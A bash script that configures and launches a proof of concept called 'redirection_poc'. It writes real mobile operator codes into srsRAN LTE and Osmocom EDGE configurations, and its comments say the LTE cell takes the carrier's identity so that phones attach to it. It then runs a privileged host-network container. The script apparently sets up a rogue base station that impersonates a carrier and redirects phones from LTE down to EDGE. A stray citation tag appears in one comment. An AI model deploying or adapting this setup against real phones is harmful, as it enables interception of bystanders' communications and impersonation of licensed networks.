#!/bin/bash
# --- 1. Root & Environment Check ---
if [[ $EUID -ne 0 ]]; then
   echo -e "\033[0;31m[ERROR] This script must be run as root.\033[0m" 
   exit 1
fi

# --- 2. Dynamic Configuration ---
echo -e "\033[0;32m[?] Network Configuration:\033[0m"

DEFAULT_IP=$(hostname -I | awk '{print $1}')
read -p "Enter Local Host IP (Default: $DEFAULT_IP): " USER_IP
USER_IP=${USER_IP:-$DEFAULT_IP}

# Configuration du MNO (LTE Anchor)
echo -e "\n\033[0;33m--- MNO Configuration (for srsRAN / LTE) ---\033[0m"
read -p "Enter MNO MCC (e.g., 208 for France): " MNO_MCC
read -p "Enter MNO MNC (e.g., 01 for Orange): " MNO_MNC
read -p "Enter LTE TAC (e.g., 7): " USER_TAC

# Configuration du MVNO (Target EDGE)
echo -e "\n\033[0;33m--- MVNO Configuration (for Osmocom / EDGE) ---\033[0m"
read -p "Enter MVNO MCC (e.g., 208): " MVNO_MCC
read -p "Enter MVNO MNC (e.g., 26 for NRJ Mobile): " MVNO_MNC

echo -e "\n\033[0;32m[*] Injecting configurations via sed...\033[0m"

# 1. Remplacement de l'IP globale [cite: 14, 17, 18]
find ./configs ./scripts -type f -exec sed -i "s/192.168.1.69/$USER_IP/g" {} +

# 2. Application de l'identité MVNO sur Osmocom (EDGE) 
# On configure le BSC et le MSC avec le code du MVNO
sed -i "s/mcc [0-9]*/mcc $MVNO_MCC/g" configs/osmo-bsc.cfg configs/osmo-msc.cfg 2>/dev/null || true
sed -i "s/mnc [0-9]*/mnc $MVNO_MNC/g" configs/osmo-bsc.cfg configs/osmo-msc.cfg 2>/dev/null || true

# 3. Application de l'identité MNO sur srsRAN (LTE) 
# On configure l'EPC et l'eNodeB avec le code du MNO pour que le téléphone s'y attache
sed -i "s/mcc = [0-9]*/mcc = $MNO_MCC/g" configs/srsran/epc.conf configs/srsran/enb.conf 2>/dev/null || true
sed -i "s/mnc = [0-9]*/mnc = $MNO_MNC/g" configs/srsran/epc.conf configs/srsran/enb.conf 2>/dev/null || true
sed -i "s/tac = [0-9]*/tac = $USER_TAC/g" configs/srsran/epc.conf configs/srsran/rr.conf 2>/dev/null || true

# --- 3. Build & Run ---
echo -e "\033[0;32m[*] Starting Build and Container...\033[0m"
./build.sh

docker run -d \
    --rm \
    --name egprs \
    --privileged \
    --cap-add NET_ADMIN \
    --cap-add SYS_ADMIN \
    --net host \
    -v /sys/fs/cgroup:/sys/fs/cgroup:rw \
    --tmpfs /run --tmpfs /run/lock --tmpfs /tmp \
    redirection_poc

sleep 3
docker exec -it egprs /bin/bash -c "/root/run.sh"
